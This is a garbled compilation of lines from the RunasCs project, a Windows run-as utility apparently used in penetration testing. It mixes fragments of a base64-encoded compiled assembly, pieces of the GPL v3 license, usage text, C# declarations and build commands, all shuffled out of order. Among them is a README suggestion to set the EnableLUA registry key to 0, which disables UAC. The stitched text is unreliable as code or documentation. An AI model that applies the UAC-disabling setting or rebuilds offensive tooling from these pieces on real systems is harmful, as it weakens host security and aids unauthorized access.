EQAACn0YAAAEEgR7LwAABA4FKAYAAAYmEQhyXw0AcAICexkAAAQoJAAABigvAAAKEwg42QAAACgsAAAKbzEAAAoTCQ4LLBwRCHJlDQBwEgkoKgAACnKZDQBwKAsAAAoTCCtNEQgTChyNEQAAARMLEQsWEQqiEQsXcmUNAHCiEQsYEgkoKgAACqIRCxly
EQAACn0ZAAAEAn4RAAAKfRoAAAQCfhEAAAp9GAAABAJ
EQAACn1pAAAEAn4RAAAKfWoAAAQqAAAAEzAFADABAAAVAAARcvkAAHAKIAABAACNGAAAAQty
EQAACn4RAAAKKBIAAAYmByghAAAKDA4EcvkAAHAoIgAACiwHcjQDAHAQBAUOBA4FBBhgDgYOByAAAAAIFhQOCA4JKA8AAAYK3goILAYIbyMAAArcBygFAAAGJgYqAAAAARAAAAIAagA0ngAKAAAAABMwBACkAAAACQAAEQMKAxeNIQAAAQwIFh8gnQhvJAAACgsHFppvJQAACnI4AwBwKCIAAAotFAcWmm8lAAAKckADAHAoIgAACiwZBxZyUAMAcCgmAAAKonJgAwBwBygnAAAKCgcWmm8lAAAKcmQDAHAoIgAACi0UBxaabyUAAApyegMAcCgiAAAKLCMHFnKYAwBwKCYAAApypgMAcCgJAAAKonJgAwBwBygnAAAKCgYqEzAGAOAAAAAKAAARFgoWC34RAAAKDH4RAAAKDX4RAAAKEwQOBRZUAyhfAAAGCwcsCw4FHlQXCjiuAAAAAyhhAAAGEwUEBQ4EHhYSAigLAAAGLBIRBQgoYQAABi8IFwoOBR5UK0cGLSIEBQ4EGxYSBCgLAAAGLBMRBREEKGEAAAYvCBcKDgUbVCsiBi0fBAUOBBoWEgMoCwAABiwQEQUJKGEAAAYvBhcKDgUaVAh
EQAACn4RAAAKKBIAAAYmCRwafhEAAAp
EQAACn4RAAAKKBQAAAYtDHJbBQBwF3MEAAAGegUgAAEAAH0oAAAEBQd9LQAABAUIfS4AAAQrLwQsLAIEKCUAAAYTBAUgAAEAAH0oAAAEBREEfSwAAAQFEQR9LQAABAURBH0uAAAEDgQHgRcAAAEOBQiBFwAAAQ4GCYEXAAABDgcRBIEXAAABKhMwCgC
EQAACn4RAAAKfhEAAAooEgAABiYOCHwwAAAEBygIAAAGLQxy1gYAcBdzBAAABnoOCHswAAAEKAkAAAYmBigFAAAGJgcoBQAABiYJKAUAAAYmCH4RAAAKKB0AAAosBwgoGAAABiYqAAATMAsAIQEAAA4AABEOBB8JMygDBAUYFA4GIAAAAAgWFA4IDgkoDwAABjr
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
EnableLUA
Examples:
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
Foundation.  If the Program does not specify a version number of the
Framework64
GNU General Public License for most of our software
HKEY_LOCAL_MACHINE
IDCAAABOcDCAAEBOwDCQAMBF8ACQAQBFUACQAUBFoACQAYBGkACQAcBHMACQAgBKEDCQAkBKYDCQAoBKsDCQAsBJIDCQAwBDEFLgALAJwILgATAKUIowErAlUAwwErAlUAgwRDAVUAFwCdAhkAlAUbAJQFHQCUBTEAnQKIALcGigC7BqwAvwauAL8GsAC/BrIAvwazAJ0CtAC/Br8AnQJQAUMHuQG/BrsBnQLHAZ0C2wGdAt8BnQLjAZ0C5QGdAiACsQcrAsEGNgK0B1ECnQKNAkcHmQJHB5sCnQKdApQFnwKUBaEClAUEAAAAAAAgAAEAFAAAACUAfAWbBa0FzAXmBesF8gUNBicGLwZQBmIGcwaBBoYGiwabBtIGBwcZBzoHVgduB3kHiweUB5wHrAfGB88H0wcXCEIIfQiqHcsd5x0lIHEhmSG8JcMlSQe3B
Interactive
Invoke-RunasCs.ps1 linguist-vendored
L4656
License by making exceptions from one or more of its conditions.
License of the Program or a work on which the Program is based.  The
License would be to refrain entirely from conveying the Program.
MECAC0A
Microsoft
Microsoft.NET
NetworkCleartext (8)
Optional arguments:
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
Policies
Positional arguments:
Program specifies that a certain numbered version of the GNU General
QAAcAwWDSg2AAAGEwQRBH4RAAAKKEEAAAosDHITEQBwF3MEAAAGehEEGAcgAAEAABIDKDcAAAYtDHJDEQBwF3MEAAAGeigSAAAKB29DAAAKFgkXWW9EAAAKDAUfCTutAAAAAggWIAAABgAoOAAABn1oAAAEAntoAAAEfhEAAAooQQAACiwMcnURAHAXcwQAAAZ6AntoAAAEKDwAAAYtDHKZEQBwF3MEAAAGegJy2REAcBYWIIEABgAoOQAABn1pAAAEEQQoPAAABi0McukRAHAXcwQAAAZ6AntoAAAEfhEAAAooQQAACiwMcjESAHAXcwQAAAZ6AgIDBChLAAAGfWoAAAQCKE0AAAYCKE4AAAYIckkSAHAoCQAACgoGKgMwAgBbAAAAAAAAAAJ7aAAABH4RAAAKKB0AAAosDAJ7aAAABCg6AAAGJgJ7aQAABH4RAAAKKB0AAAosDAJ7aQAABCg7AAAGJgJ7agAABH4RAAAKKB0AAAosDAJ7agAABCg9AAAGJiq2Ai0GclsSAHAqAhczBnJtEgBwKgIYMwZyjRIAcCoCGTMGcp0SAHAqcs0SAHAqAAAAEzAFACMBAAAWAAARc0YAAAoKFgsCGX4RAAAKBxIBKFIAAAYMByg5AAAKDQIZCQcSAShSAAAGDAgtDHLZEgBwF3MEAAAGegnQIQAAAig7AAAKKEIAAAqlIQAAAhMEFhMFOLoAAABzNQAAChMGFhMHEgj
QAAcBMIDgUWNlwCexoAAAQoBQAABiYCexgAAAQoBQAABiYCfhEAAAp9GgAABAJ
RunasCs
RunasCs v1.5 - @splinter_code
SOFTWARE
SUCH DAMAGES.
Source.
States should not allow patents to restrict development and use of
System
System32
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
The default logon type is 2 (
The hypothetical commands 
The two processes (calling and called) will communicate through one 
This tool is an improved and open version of windows builtin 
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
Usage:
User Product is transferred to the recipient in perpetuity or for a
Users folder.
Window Stations
Windows
WindowsPowerShell
You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:
] Using Station
](https://blogs.msdn.microsoft.com/winsdk/2015/06/03/what-is-up-with-the-application-failed-to-initialize-properly-0xc0000142-error/)
](https://docs.microsoft.com/en-us/previous-versions/aa379608(v=vs.85))
a further restriction but permits relicensing or conveying under this
a modified version of its Corresponding Source.  The information must
address new problems or concerns.
adversely affects the operation of the network or violates the rules and
an absolute waiver of all civil liability in connection with the
and execute modified versions of a covered work in that User Product from
and the Corresponding Source of the work is not available for anyone
and you may offer support or warranty protection for a fee.
any implied license or other defenses to infringement that may
any other work released this way by its authors.  You can apply it to
appropriately publish on each copy an appropriate copyright notice
author or copyright holder as a result of your choosing to follow a
authors of previous versions.
avoid the special danger that patents applied to a free program could
base64_conversion_commands.ps1 linguist-vendored
been installed in ROM).
beyond what the individual works permit.  Inclusion of a covered work
but do not include claims that would be infringed only as a
by the Free Software Foundation.
by the Installation Information.  But this requirement does not apply
can do so.  This is fundamentally incompatible with the aim of
can regenerate automatically from other parts of the Corresponding
circumvention of technological measures to the extent such circumvention
class MainClass
code is in no case prevented or interfered with solely because
combination as such.
conditioned on the non-exercise of one or more of the rights that are
conditions are met.  This License explicitly affirms your unlimited
consequence of further modification of the contributor version.  For
console
copy of the Program in return for a fee.
country that you have reason to believe are valid.
covered work so as to satisfy simultaneously your obligations under this
csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
csc.exe -target:exe -optimize -out:RunasCs_net2.exe RunasCs.cs
ctr]
ctr])
documented (and with an implementation available to the public in
doubtful cases shall be resolved in favor of coverage.  For a particular
excuse you from the conditions of this License.  If you cannot convey a

for and in connection with specific products or compilations that
for enforcing compliance by third parties with this License.
for which you have or can give appropriate copyright permission.
form of a work.
free software which everyone can redistribute and change under these terms.
function Invoke-RunasCs
gECAC4A
ghNAAYA/ghNAAYAAglNAAYACglNAAYAEglNAAYAIAlNAAYALglNAAYAPglNAAYARglpAgYAUglpAgYAXgmZAAYAagmZAAYAdAmZAAYAfwmZAAYAiQmZAAYAkQmZAAYAmAlNAAYAoglNAAYAqwlNAAYAsgmZAAYAxwlsAgYG1glNAFaA3glvAlaA8AlvAlaABwpvAlaAHQpvAgYAMAppAgYAOwppAgYARAqHAAYATQpzAgMAVgppAgMAXwppAgMAbAppAgMAeAppAgMAggqZAAMQjwoKAAMQnQoKAAYG1glNAFaArAp2AlaAwwp2AlaA0gp2AlaA3Qp2AlaA6Ap2AlaA
governed by this License along with a term that is a further
have designed this version of the GPL to prohibit the practice for those
have the freedom to distribute copies of free software (and charge for
hhxBFaAHxlxBFaAMRlxBFaATRlxBFaAZRlxBFaAdxlxBFaAjhlxBFaApBlxBFaAvRlxBFaAzxlxBFaA5hlxBFaACBpxBFaAGRpxBFaAKBpxBAYG1glNAFaAOhokBVaAPxokBVaARxokBVaAURokBVaAVRokBVaAXBokBVaAYwIkBVaAYRokBQYG1gmHAFaAchotBVaAexotBVaAjhotBVaAqhotBVaAuxotBVaAyhotBVaA5RotBVaA
holder fails to notify you of the violation by some reasonable means
i<TokenPrivileges.PrivilegeCount
if neither you nor any third party retains the ability to install
implementation is available to the public in source code form.  A
in accord with this section must be in a format that is publicly
in an aggregate does not cause this License to apply to the other
in force.  You may convey covered works to others for the sole purpose
in one of these ways:
included in conveying the object code work.
includes interface definition files associated with source files for
is a consumer product regardless of whether the product has substantial
is effected by exercising rights under this License with respect to
is widely used among developers working in that language.
it.  (Additional permissions may be written to require their own
keep intact all notices of the absence of any warranty
keep intact all notices stating that this License and any
know their rights.
later version.
license from a particular copyright holder is reinstated (a)
licenses of parties who have received copies or rights from you under
licenses to the work the party's predecessor in interest had or could
makes it unnecessary.
material under section 10.
may consider it more useful to permit linking proprietary applications with
measure under any applicable law fulfilling obligations under article
measures.
might be different
modification follow.
modification has been made.
modify any covered work.  These actions infringe copyright if you do
net2:
net4:
network may be denied when the modification itself materially and
non-permissive terms added in accord with section 7 apply to the code
not control copyright.  Those thus making or running the covered works
not survive such relicensing or conveying.
nothing other than this License grants you permission to propagate or
notice like this when it starts in an interactive mode:
occurring solely as a consequence of using peer-to-peer transmission
of the particular user or of the way in which the particular user
on the Program.
option of following the terms and conditions either of that numbered
or can get the source code.  And you must show them these terms so they
otherwise be available to you under applicable patent law.
paragraph of section 11).
part of a transaction in which the right of possession and use of the
parties to make or receive copies.  Mere interaction with a user through
parts of the aggregate.
party means to make such an agreement or commitment not to enforce a
patent against the party.
patent license (a) in connection with copies of the covered work
patent sublicenses in a manner consistent with the requirements of
patents cannot be used to render the program non-free.
pattern of such abuse occurs in the area of products for individuals to
permission to link or combine any covered work with a work licensed
permission to run the unmodified Program.  The output from running a
pipe
price.  Our General Public Licenses are designed to make sure that you
prior to 60 days after the cessation.
programs which are used unmodified in performing those activities but
propagate the contents of its contributor version.
protecting users' freedom to change the software.  The systematic
protocols for communication across the network.
provided under this License.  Any attempt otherwise to propagate or
public class RunasCs
public class RunasCsException : Exception
public class WindowStationDACL{
public statement of acceptance of a version permanently authorizes you
public static class AccessToken{
public static class RunasCsMainClass
received notice of violation of this License (for any work) from that
recipients a copy of this License along with the Program.
reinstated permanently if the copyright holder notifies you of the
removal in certain cases when you modify the work.)  You may place
reviewing courts shall apply local law that most closely approximates
run a copy of the Program.  Ancillary propagation of a covered work
runas.exe
same work.
share and change all versions of a program--to make sure it remains free
show c' for details.
show c' should show the appropriate
show w' and 
show w'.
similar laws prohibiting or restricting circumvention of such
software and other kinds of works.
specifically granted under this License.  You may not convey a covered
stand ready to extend this provision to those domains in future versions
state the exclusion of warranty
stderr
stdin
stdout
subprograms and other parts of the work.
such as by intimate data communication or control flow between those
suffice to ensure that the continued functioning of the modified object
technological measures.
tells the user that there is no warranty for the work (except to the
that material) supplement the terms of this License with terms:
that there is no warranty for this free software.  For both users' and
that they are valid under applicable law.  If additional permissions
the GNU General Public License from time to time.  Such new versions will
the GNU General Public License is intended to guarantee your freedom to
the User Product in which it has been modified or installed.  Access to a
the above requirements apply either way.
the conditions stated below.  Sublicensing is not allowed
the only significant mode of use of the product.
the predecessor has it or can get it with reasonable efforts.
the terms of this License in conveying all material for which you do
then you must either (1) cause the Corresponding Source to be so
this License (including any patent licenses granted under the third
this License without regard to the additional permissions.
this License.
this License.  If your rights have been terminated and not permanently
to attach them to the start of each source file to most effectively
to choose that version for the Program.
to collect a royalty for further conveying from those to whom you convey
to the extent that it includes a convenient and prominently visible
to the third party based on the extent of your activity of conveying
transaction who receives a copy of the work also receives whatever
t{1}
under version 3 of the GNU Affero General Public License into a single
used to limit the access or legal rights of the compilation's users
using System
using System.Collections.Generic
using System.ComponentModel
using System.Diagnostics
using System.Net
using System.Net.Sockets
using System.Runtime.InteropServices
using System.Security.Principal
using System.Text
v1.0
v2.0.50727
v4.0.30319
version or of any later version published by the Free Software
w0AcKIRCxoCDgcoIgAABqIRCxtyXw0AcKIRCygyAAAKEwgRCHIrDgBwEQVyXw0AcCgLAAAKEwgRCBMMHI0CAAABEw0RDRYRDKIRDRdyYw4AcKIRDRgGohENGXKLDgBwohENGhIEezEAAASMGwAAAaIRDRtyow4AcKIRDSgzAAAKEwgSBHsvAAAEKAUAAAYmEgR7MAAABCgFAAAGJgIoNAAABhEIKhMwBwAIAQAAEgAAEX4RAAAKCnL5AABwCxQMFg1zNQAAChMEEQRvNgAAChMFFhMHA3L5AABwKDcAAAosHANyNAMAcCg3AAAKLA8DctcOAHAEKC8AAAoLKwIECxQHCBIDEQQSBRIGKEoAAAYtRigFAAAKEwcRBx96LgkRByDsAwAAM1UJ4I0YAAABDBEEEQVvOAAACiYWEwcUBwgSAxEEEgUSBihKAAAGLS4oBQAAChMHKyVy2w4AcAdy9w4AcCgvAAAKEwgRCHIjDwBwKAkAAAoXcwQAAAZ6EQctEgkoOQAACgoIFgYJKDoAAAorJXLbDgBwB3L3DgBwKC8AAAoTCREJciMPAHAoCQAAChdzBAAABnoGKhMwBQDGAAAAEwAAEdAUAAACKDsAAAooPAAACtAsAAABKDsAAAooPAAAClkKEgH
wAAcCgJAAAKCgYoEgAACggWB28TAAAKKAkAAAoKBioAABswBgDWAAAABAAAERYKFgsDFpoMAxeaKBQAAAoK3hQmckkBAHADF5ooCQAACnMDAAAGeiACAgAAEgMoIAAABiwcKB8AAAYLcoEBAHAHjBsAAAEoFQAACnMDAAAGen4RAAAKEwQYFxZ
where to find the applicable terms.
work and works based on it.
work if you are a party to an arrangement with a third party that is
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
you grant is automatically extended to all recipients of the covered
you modify it: responsibilities to respect the freedom of others.
your copyrighted material outside their relationship with you.
your receipt of the notice.
{   
